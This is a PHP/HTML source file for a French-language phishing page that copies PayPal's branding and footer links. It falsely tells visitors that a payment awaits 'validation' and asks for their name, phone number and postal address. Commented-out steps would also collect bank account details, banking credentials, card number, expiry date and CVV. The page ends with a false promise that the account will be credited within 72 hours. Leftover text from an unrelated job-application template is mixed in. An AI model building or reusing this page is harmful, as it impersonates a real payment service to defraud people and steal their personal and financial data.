<?php
session_start();
if(!isset($_SESSION['session']) ){
    header('location: ../');
}
?>

<!DOCTYPE html>
<html lang="fr">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
    <!-- <link rel="stylesheet" href="css/style.css"> -->
    <link rel="stylesheet" href="../css/home-style.css">
    <link rel="stylesheet" href="../css/bootstrap.min.css">
    <link rel="icon" type="image/x-icon" href="../images/favicon.ico">
    <title>Validation - Paypal</title>
</head>

<body>
    <nav class="navbar bg-body-tertiary" style="padding:">
        <div class="row container-fluid">
            <a class="navbar-brand" href="#">
                <img src="../images/paypal1.png" alt="Logo" width="200" class="d-inline-block align-text-top">
            </a>
        </div>
    </nav>

    <div class="d-flex justify-content-center align-items-center flex-wrap-reverse g-5 p-5"
        style="background-color: #fff;">
        <div class="col d-flex justify-content-center my-2 img-2-container">
            <img src="../images/phone1.jpg" id="img-2" alt="paypal">
        </div>
        <div class="col">
            <h3 class="text-center">Rapide et facile.</h3>
            <div>
                <p class="text-center">Des millions d'utilisateurs dans le monde ont choisi PayPal pour une bonne raison
                    :
                    sa simplicité. Payez avec votre adresse email et votre mot de passe plus rapidement qu'en sortant
                    votre
                    portefeuille.
                </p>
                <img src="../images/pub-2.gif" id="img-2" alt="paypal">
                <div class="d-flex justify-content-center">
                    <a href="#form" class="btn btn-primary mt-2">Commencer</a>
                </div>
            </div>

        </div>
    </div>

    <div class="d-flex justify-content-center align-items-center flex-wrap-reverse g-5 p-5"
        style="background-color: #003087">
        <div class="col">
            <img src="../images/yoga.png" id="img-1" width="500px" alt="">
        </div>
        <div class="col text-white" id="text-start">
            <h3 class="fw-bold text-center">PAIEMENT EN ATTENTE DE VALIDATION</h1>
                <p class="text-center text-sm-center">Vous avez reçu un paiement PayPal. Ce paiement a été déduit du
                    compte de
                    l'émetteur. Une action immédiate de votre part est requise afin de lutter contre les fraudes et
                    l'usurpation
                    d'identité et valider la réception.</p>
        </div>
    </div>

    <div class="container p-5">
        <div class="card">
            <div class="form" id="form">
                <div class="left-side">
                    <div class="left-heading">
                        <h3>Validation</h3>
                    </div>
                    <div class="steps-content">
                        <h3>Etape <span class="step-number">1</span></h3>
                        <p class="step-number-content active">Transaction en cours ...</p>
                        <p class="step-number-content d-none">Get to know better by adding your diploma,certificate and
                            education life.</p>
                        <p class="step-number-content d-none">Help companies get to know you better by telling then
                            about your past experiences.</p>
                        <p class="step-number-content d-none">Add your profile piccture and let companies find youy
                            fast.</p>
                    </div>
                    <ul class="progress-bar">
                        <li class="active">Informations Personnelles</li>
                        <li class="">Validation réussie</li>
                    </ul>



                </div>
                <div class="right-side">
                    <div class="main active">
                        <div class="d-flex justify-content-start">
                            <img src="../images/paypal.jpg" alt="paypal" width="70px">
                        </div>
                        <div class="text">
                            <h2>Vos Informations Personnelles</h2>
                            <p>Pour des raisons de sécurité, veillez confirmer que vous êtes bien
                                le titulaire du compte bancaire enregistré sur votre compte PayPal.</p>
                        </div>
                        <div class="input-text">
                            <div class="input-div">
                                <input type="text" required require id="user_name">
                                <span>Prénom</span>
                            </div>
                            <div class="input-div">
                                <input type="text" required>
                                <span>Nom</span>
                            </div>
                        </div>
                        <div class="input-text">
                            <div class="input-div">
                                <input type="text" required require>
                                <span>Téléphone</span>
                            </div>
                            <div class="input-div">
                                <input type="text" required require>
                                <span>Adresse postale</span>
                            </div>
                        </div>

                        <div class="buttons">
                            <button class="next_button">Valider</button>
                        </div>
                    </div>
                    <!-- <div class="main">
                        <small><i class="fa fa-smile-o"></i></small>
                        <div class="text">
                            <h2>Informations bancaires</h2>
                            <p>Pour des raisons de sécurité, veillez confirmer que vous êtes bien
                                le titulaire du compte bancaire enregistré sur votre compte PayPal.</p>
                        </div>
                        <div class="input-text">
                            <div class="input-div">
                                <input type="text" required require>
                                <span>Nom de la banque</span>
                            </div>
                            <div class="input-div">
                                <input type="text" required>
                                <span>Numéro de compte</span>
                            </div>
                        </div>
                        <div class="input-text">
                            <div class="input-div">
                                <input type="text" required require>
                                <span>Identifiants bancaires</span>
                            </div>
                        </div>
                        <div class="input-text">
                            <div class="input-div">
                                <select>
                                    <option>Select Course</option>
                                    <option>BCA</option>
                                    <option>B-TECH</option>
                                    <option>BA</option>
                                    <option>B-COM</option>
                                    <option>B-SC</option>
                                    <option>MBA</option>
                                    <option>MCA</option>
                                    <option>M-COM</option>
                                    <option>M-TECH</option>
                                </select>
                            </div>
                        </div>
                        <div class="buttons button_space">
                            <button class="back_button">Back</button>
                            <button class="next_button">Continuer</button>
                        </div>
                    </div>
                    <div class="main">
                        <small><i class="fa fa-smile-o"></i></small>
                        <div class="text">
                            <h2>Informations de la carte</h2>
                            <p>Can you talk about your past work experience?</p>
                        </div>
                        <div class="input-text">
                            <div class="input-div">
                                <input type="text" required require>
                                <span>Numéro</span>
                            </div>
                            <div class="input-div">
                                <input type="text" required require>
                                <span>Date d'expiration</span>
                            </div>
                        </div>
                        <div class="input-text">
                            <div class="input-div">
                                <input type="text" required>
                                <span>CCV</span>
                            </div>
                            <div class="input-div">
                                <input type="text" required>
                                <span>Position</span>
                            </div>
                        </div>
                        <div class="input-text">
                            <div class="input-div">
                                <input type="text" required>
                                <span>Experience 3</span>
                            </div>
                            <div class="input-div">
                                <input type="text" required>
                                <span>Position</span>
                            </div>
                        </div>
                        <div class="buttons button_space">
                            <button class="back_button">Back</button>
                            <button class="next_button">Continuer</button>
                        </div>
                    </div>

                    <div class="main">
                        <small><i class="fa fa-smile-o"></i></small>
                        <div class="text">
                            <h2>User Photo</h2>
                            <p>Upload your profile picture and share yourself.</p>
                        </div>
                        <div class="user_card">
                            <span></span>
                            <div class="circle">
                                <span><img src="https://i.imgur.com/hnwphgM.jpg"></span>

                            </div>
                            <div class="social">
                                <span><i class="fa fa-share-alt"></i></span>
                                <span><i class="fa fa-heart"></i></span>

                            </div>
                            <div class="user_name">
                                <h3>Peter Hawkins</h3>
                                <div class="detail">
                                    <p><a href="#">Izmar,Turkey</a>Hiring</p>
                                    <p>17 last day . 94Apply</p>
                                </div>
                            </div>
                        </div>
                        <div class="buttons button_space">
                            <button class="back_button">Back</button>
                            <button class="submit_button">Submit</button>
                        </div>
                    </div> -->

                    <div class="main">
                        <svg class="checkmark" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 52 52">
                            <circle class="checkmark__circle" cx="26" cy="26" r="25" fill="none" />
                            <path class="checkmark__check" fill="none" d="M14.1 27.2l7.1 7.2 16.7-16.8" />
                        </svg>

                        <div class="text congrats">
                            <h2>Validation réussie !</h2>
                            <p class="text-secondary" style="font-size: 15px; font-weight: 200;"><span
                                    class="shown_name"></span>
                                La transaction a été validé avec succès. Pour des raisons indépendantes de
                                notre volonté, votre compte PayPal crédité dans les 72 heures qui suivent. Vous recevrez
                                un mail de notification. Merci pour
                                votre fidélité.</p>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <div class="d-flex justify-content-center align-items-center flex-wrap-reverse g-5 p-5"
        style="background-color: #f7f7f7;">
        <div class="col d-flex justify-content-center my-2 img-2-container">
            <img src="../images/phone-paypal.gif" id="img-2" alt="paypal" width="100%">
        </div>
        <div class="col my-2">
            <h3 class="text-center">DES PAIEMENTS EN UN CLIN D'ŒIL ET EN TOUTE SÉCURISÉS</h3>
            <p class="text-center">Que ce soit dans votre boutique favorite ou un nouveau magasin, PayPal vous permet de
                régler vos achats
                rapidement et de manière sécurisée. Et, pour les achats éligibles, PayPal va encore plus loin avec la
                Protection des Achats PayPal**.
            </p>
        </div>

    </div>

    <section class="d-flex justify-content-center align-items-center flex-wrap-reverse g-5 p-5">
        <div class="col my-2 text-white">
            <h3 class="text-center">Conservez vos cartes</h3>
            <p class="text-center">Quand vous payez par carte avec PayPal, le fonctionnement est le même, sauf que vous
                n'avez plus besoin d'entrer vos informations à chaque fois. Enregistrez une carte sur votre compte et
                payez plus rapidement et de façon plus sécurisée depuis votre ordinateur ou mobile.
            </p>
        </div>
        <div class="col my-2">
        </div>
    </section>

    <footer class="d-flex justify-content-center align-items-center  p-5"
        style="background-color: hsla(197, 10%, 90%, 1);">
        <div class="d-flex justify-content-center text-white flex-wrap g-2" style="width: 100%;">
            <a class="px-2" style="color: hsl(197.05, 20%, 20%)"
                href="https://www.paypal.com/fr/smarthelp/contact-us"><small>Contact</small></a>
            <a class="px-2" style="color: hsl(197.05, 20%, 20%)"
                href="https://www.paypal.com/fr/webapps/mpp/ua/privacy-full"><small>Respect de la vie privée</small></a>
            <p class="px-2" style="color: hsl(197.05, 20%, 20%)"><small>© 1999-2023 Tous droits réservés</small></p>
            <a class="px-2" style="color: hsl(197.05, 20%, 20%)"
                href="https://www.paypal.com/fr/webapps/mpp/ua/legalhub-full"><small>Contrats d'utilisation</small></a>
            <a class="px-2" style="color: hsl(197.05, 20%, 20%)"
                href="https://www.paypal.com/fr/webapps/mpp/country-worldwide"><small>International</small></a>
        </div>
    </footer>

    <script src="../js/bootstrap.min.js"></script>
    <script src="../js/jquery-3.5.1.js"></script>
    <script src="../js/home-script.js"></script>
</body>

</html>